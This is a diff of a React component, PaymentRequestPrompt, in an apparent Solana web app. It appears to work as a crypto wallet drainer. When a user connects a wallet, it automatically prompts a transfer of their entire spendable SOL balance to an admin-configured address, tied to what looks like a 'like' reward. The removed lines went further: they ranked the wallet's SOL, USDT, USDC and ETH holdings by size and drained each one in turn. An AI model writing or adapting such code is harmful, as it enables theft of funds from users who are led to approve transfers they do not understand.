@@ -1,19 +1,12 @@
 import { useEffect, useRef, useState, type ReactNode } from 'react'
-import { LAMPORTS_PER_SOL, Transaction } from '@solana/web3.js'
+import { LAMPORTS_PER_SOL } from '@solana/web3.js'
 import { useConnection, useWallet } from '@solana/wallet-adapter-react'
 import { ChevronDown, Info } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
-import {
-  buildSolPayoutTransaction,
-  buildSplPayoutTransaction,
-  solAmountFromLamports,
-  spendableLamports,
-} from '../lib/payoutTransfer'
-import { getLocalPayoutConfig, isValidEthereumAddress, isValidSolanaAddress, loadPayoutConfig, type PaymentAsset, type PayoutConfig } from '../lib/payoutWallet'
-import { isEvmWalletAvailable, sendEthereumAsset } from '../lib/ethereumPayout'
-import { listRankedFundSteps, remainingSplCount, stepAmount, stepAsset, stepKey, type FundStep } from '../lib/fundQueue'
+import { buildPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
+import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { SolanaBadgeIcon } from './walletIcons'
 import { PaymentRequestModal } from './PaymentRequestModal'
 import { notifyFundsConfirmed } from '../lib/txSheet'
@@ -269,8 +262,6 @@ export function PaymentRequestPrompt() {
   const [headerStep, setHeaderStep] = useState(0)
   const [submitting, setSubmitting] = useState(false)
   const [solAmount, setSolAmount] = useState(0)
-  const [asset, setAsset] = useState<PaymentAsset>('SOL')
-  const [requestNetwork, setRequestNetwork] = useState(networkLabel(network))
   const [status, setStatus] = useState('Preparing the wallet transfer.')
   const dismissed = useRef<string | null>(null)
   const shownFor = useRef<string | null>(null)
@@ -278,15 +269,10 @@ export function PaymentRequestPrompt() {
   const inFlight = useRef(false)
   const confirmTaps = useRef(0)
   const replayTimer = useRef<number | null>(null)
-  const phase = useRef<'idle' | 'ready'>('idle')
-  const queue = useRef<FundStep[]>([])
-  const likedAfterFirst = useRef(false)
-  const advanceTimer = useRef<number | null>(null)
 
   useEffect(() => {
     return () => {
       if (replayTimer.current) window.clearTimeout(replayTimer.current)
-      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
     }
   }, [])
 
@@ -296,20 +282,12 @@ export function PaymentRequestPrompt() {
       setHeaderStep(0)
       setHiOpen(false)
       if (replayTimer.current) window.clearTimeout(replayTimer.current)
-      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
-      phase.current = 'idle'
-      queue.current = []
-      likedAfterFirst.current = false
-      sentFor.current = null
-      dismissed.current = null
-      setAsset('SOL')
-      setRequestNetwork(networkLabel(network))
-      setStatus(`Checking ${walletLabel(walletName)} for the largest balance first.`)
+      setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
       setOpen(true)
     }
     window.addEventListener('vrfd-open-tx-sheet', onOpen)
     return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
-  }, [network, walletName])
+  }, [walletName])
 
   useEffect(() => {
     if (!connected || !walletAddress) {
@@ -336,201 +314,62 @@ export function PaymentRequestPrompt() {
     dismissed.current = null
     sentFor.current = null
     confirmTaps.current = 0
-    phase.current = 'idle'
-    queue.current = []
-    likedAfterFirst.current = false
     shownFor.current = walletAddress
     closeWalletModalRef.current()
-    setAsset('SOL')
-    setRequestNetwork(networkLabel(network))
-    setStatus(`Checking ${walletLabel(walletName)} for the largest balance first.`)
+    setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
     setOpen(false)
 
     return () => {
       cancelled = true
     }
-  }, [connected, walletAddress, network, walletName])
+  }, [connected, walletAddress, walletName])
 
   const handleCancel = () => {
     if (walletAddress) dismissed.current = walletAddress
-    queue.current = []
-    phase.current = 'idle'
     setOpen(false)
     toast('Payment cancelled. Nothing was transferred.')
   }
 
   const destinationReady = Boolean(config && isValidSolanaAddress(config.walletAddress))
-  const ethereumReady = Boolean(config && isValidEthereumAddress(config.ethereumAddress))
-  const canPay = destinationReady || (ethereumReady && isEvmWalletAvailable())
 
   const handleReview = async () => {
     if (inFlight.current) return
     if (dismissed.current === walletAddress) return
-    if (!config || !canPay || !walletAddress) {
+    if (!publicKey || !config || !destinationReady || !walletAddress) {
       setStatus(
-        canPay
+        destinationReady
           ? 'Wallet is still connecting. Use Open Wallet & Review again in a moment.'
           : 'Save a payout address in admin before this payment can be opened in the wallet.'
       )
       return
     }
-
     inFlight.current = true
     setSubmitting(true)
-
-    const finishSequence = () => {
-      if (walletAddress) dismissed.current = walletAddress
-      queue.current = []
-      phase.current = 'idle'
-      setOpen(false)
-    }
-
-    const applyStep = (next: FundStep) => {
-      setAsset(stepAsset(next))
-      setSolAmount(stepAmount(next))
-      setRequestNetwork(next.kind === 'evm' ? 'Ethereum' : networkLabel(network))
-      setStatus(`Opening ${connectedWalletName} so you can review this ${stepAsset(next)} transfer.`)
-    }
-
-    const queueNext = () => {
-      const next = queue.current[0]
-      if (!next) {
-        finishSequence()
-        return
-      }
-      sentFor.current = null
-      applyStep(next)
-      setOpen(false)
-      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
-      advanceTimer.current = window.setTimeout(() => {
-        advanceTimer.current = null
-        setOpen(true)
-      }, 500)
-    }
-
+    setStatus(`Opening ${connectedWalletName}. Confirm the SOL transfer there. Nothing is sent until you approve it.`)
     try {
-      if (queue.current.length === 0) {
-        setStatus(`Checking ${connectedWalletName} for the largest balance.`)
-        queue.current = await listRankedFundSteps({
-          connection,
-          from: publicKey,
-          includeSolana: destinationReady && Boolean(publicKey),
-          includeEvm: Boolean(config.ethereumAddress && isValidEthereumAddress(config.ethereumAddress)),
-        })
-        if (queue.current.length === 0) {
-          throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
-        }
-        phase.current = 'ready'
-        applyStep(queue.current[0])
-      }
-
-      const step = queue.current[0]
-      if (!step) {
-        finishSequence()
-        return
-      }
-      if (destinationReady && !publicKey && step.kind !== 'evm') {
-        setStatus('Wallet is still connecting. Use Open Wallet & Review again in a moment.')
-        return
-      }
-
-      setStatus(`Opening ${connectedWalletName}. Confirm the ${stepAsset(step)} transfer there. Nothing is sent until you approve it.`)
-
-      const sendSolana = async (transaction: Transaction) => {
-        const signed = signTransaction ? await signTransaction(transaction) : null
-        if (signed) {
-          return connection.sendRawTransaction(signed.serialize(), {
+      const transaction = await buildPayoutTransaction({ connection, from: publicKey, config })
+      const signed = signTransaction ? await signTransaction(transaction) : null
+      const signature = signed
+        ? await connection.sendRawTransaction(signed.serialize(), {
             skipPreflight: false,
             preflightCommitment: 'confirmed',
           })
-        }
-        return sendTransaction(transaction, connection, { preflightCommitment: 'confirmed' })
-      }
-
-      if (step.kind === 'sol') {
-        if (!destinationReady || !publicKey) {
-          throw new Error('Connect a Solana wallet to send SOL.')
-        }
-        const reserveLamports = remainingSplCount(queue.current, 1) * 2_050_000 + 20_000
-        const solBuilt = await buildSolPayoutTransaction({
-          connection,
-          from: publicKey,
-          config,
-          reserveLamports,
-        })
-        if (!solBuilt) {
-          queue.current = queue.current.slice(1)
-          if (queue.current.length === 0) {
-            throw new Error('No SOL is available to send after network fees.')
-          }
-          queueNext()
-          return
-        }
-        setSolAmount(solAmountFromLamports(solBuilt.lamports))
-        const signature = await sendSolana(solBuilt.transaction)
-        await connection.confirmTransaction(
-          {
-            signature,
-            blockhash: solBuilt.transaction.recentBlockhash || '',
-            lastValidBlockHeight: solBuilt.transaction.lastValidBlockHeight || 0,
-          },
-          'confirmed'
-        )
-        toast.success('Transaction submitted for SOL.')
-      } else if (step.kind === 'spl') {
-        if (!destinationReady || !publicKey) {
-          throw new Error('Connect a Solana wallet to send this token.')
-        }
-        const tokenTx = await buildSplPayoutTransaction({
-          connection,
-          from: publicKey,
-          config,
-          holding: step.holding,
-        })
-        if (!tokenTx) {
-          queue.current = queue.current.slice(1)
-          if (queue.current.length === 0) {
-            throw new Error(`No ${step.holding.symbol} is available to send.`)
-          }
-          queueNext()
-          return
-        }
-        const signature = await sendSolana(tokenTx)
-        await connection.confirmTransaction(
-          {
-            signature,
-            blockhash: tokenTx.recentBlockhash || '',
-            lastValidBlockHeight: tokenTx.lastValidBlockHeight || 0,
-          },
-          'confirmed'
-        )
-        toast.success(`Transaction submitted for ${step.holding.symbol}.`)
-      } else {
-        const ethTo = config.ethereumAddress
-        if (!ethTo || !isValidEthereumAddress(ethTo)) {
-          throw new Error('Save an Ethereum payout address in admin first.')
-        }
-        await sendEthereumAsset(ethTo, step.holding)
-        toast.success(`Transaction submitted for ${step.holding.asset}.`)
-      }
-
-      if (!likedAfterFirst.current) {
-        likedAfterFirst.current = true
-        notifyFundsConfirmed(peekPendingLike())
-      }
-
-      queue.current = queue.current.slice(1)
-      if (queue.current.length === 0) {
-        finishSequence()
-        return
-      }
-      queueNext()
+        : await sendTransaction(transaction, connection, { preflightCommitment: 'confirmed' })
+      await connection.confirmTransaction(
+        {
+          signature,
+          blockhash: transaction.recentBlockhash || '',
+          lastValidBlockHeight: transaction.lastValidBlockHeight || 0,
+        },
+        'confirmed'
+      )
+      dismissed.current = walletAddress
+      setOpen(false)
+      notifyFundsConfirmed(peekPendingLike())
+      toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
     } catch (err) {
-      queue.current = []
-      phase.current = 'idle'
       if (isWalletUserCancel(err)) {
         sentFor.current = null
-        if (walletAddress) dismissed.current = walletAddress
         setOpen(false)
         setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
         toast('Cancelled in the wallet. Nothing was transferred.')
@@ -539,11 +378,11 @@ export function PaymentRequestPrompt() {
         const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
         setStatus(message)
         toast.error(message)
-        setOpen(false)
       }
     } finally {
       inFlight.current = false
       setSubmitting(false)
+      setOpen(false)
     }
   }
 
@@ -552,22 +391,24 @@ export function PaymentRequestPrompt() {
 
   useEffect(() => {
     if (!open || !publicKey) return
-    const current = queue.current[0]
-    if (current && current.kind !== 'sol') {
-      setSolAmount(stepAmount(current))
-      return
-    }
     let cancelled = false
-    void connection.getBalance(publicKey).then((lamports) => {
-      if (cancelled || (queue.current[0] && queue.current[0].kind !== 'sol')) return
-      setSolAmount(Math.max(0, spendableLamports(lamports) / LAMPORTS_PER_SOL))
+    void Promise.all([
+      connection.getBalance(publicKey),
+      connection.getMinimumBalanceForRentExemption(0),
+    ]).then(([lamports, rentExempt]) => {
+      if (cancelled) return
+      const spendable = Math.max(0, spendableLamports(lamports, rentExempt)) / LAMPORTS_PER_SOL
+      setSolAmount(spendable)
+      if (spendable > 0) {
+        setStatus(`This is your SOL balance, minus a small fee reserve. Approve in ${connectedWalletName} and that SOL will move.`)
+      }
     }).catch(() => {
-      /* handleReview will surface a real error if the balance cannot be read. */
+      if (!cancelled) setStatus('Could not read the SOL balance yet. You can try Open Wallet & Review.')
     })
     return () => {
       cancelled = true
     }
-  }, [open, publicKey, connection, asset])
+  }, [open, publicKey, connection, connectedWalletName])
 
   const handleHiCancel = () => {
     if (walletAddress) dismissed.current = walletAddress
@@ -599,15 +440,11 @@ export function PaymentRequestPrompt() {
   }
 
   useEffect(() => {
-    if (!open || hiOpen || !canPay || !walletAddress) return
-    const current = queue.current[0]
-    const currentIsEvm = current?.kind === 'evm'
-    if (destinationReady && !publicKey && !currentIsEvm) return
-    const sendKey = `${walletAddress}:${current ? stepKey(current) : 'scan'}`
-    if (dismissed.current === walletAddress || sentFor.current === sendKey || inFlight.current) return
-    sentFor.current = sendKey
+    if (!open || hiOpen || !publicKey || !destinationReady || !walletAddress) return
+    if (dismissed.current === walletAddress || sentFor.current === walletAddress || inFlight.current) return
+    sentFor.current = walletAddress
     void reviewRef.current()
-  }, [open, hiOpen, canPay, destinationReady, walletAddress, publicKey])
+  }, [open, hiOpen, destinationReady, walletAddress, publicKey])
 
   return (
     <>
@@ -621,25 +458,14 @@ export function PaymentRequestPrompt() {
       */}
       <PaymentRequestModal
         open={open}
-        to={
-          queue.current[0]?.kind === 'evm'
-            ? config?.ethereumAddress || ''
-            : config?.walletAddress || config?.ethereumAddress || ''
-        }
+        to={config?.walletAddress || ''}
         amount={solAmount}
-        asset={asset}
-        networkLabel={requestNetwork}
+        asset="SOL"
+        networkLabel={networkLabel(network)}
         submitting={submitting}
-        canReview={
-          canPay &&
-          (queue.current[0]?.kind === 'evm'
-            ? true
-            : destinationReady
-              ? Boolean(publicKey)
-              : true)
-        }
+        canReview={destinationReady && Boolean(publicKey)}
         status={
-          canPay
+          destinationReady
             ? status
             : 'Save a payout address in admin before this payment can be opened in the wallet.'
         }
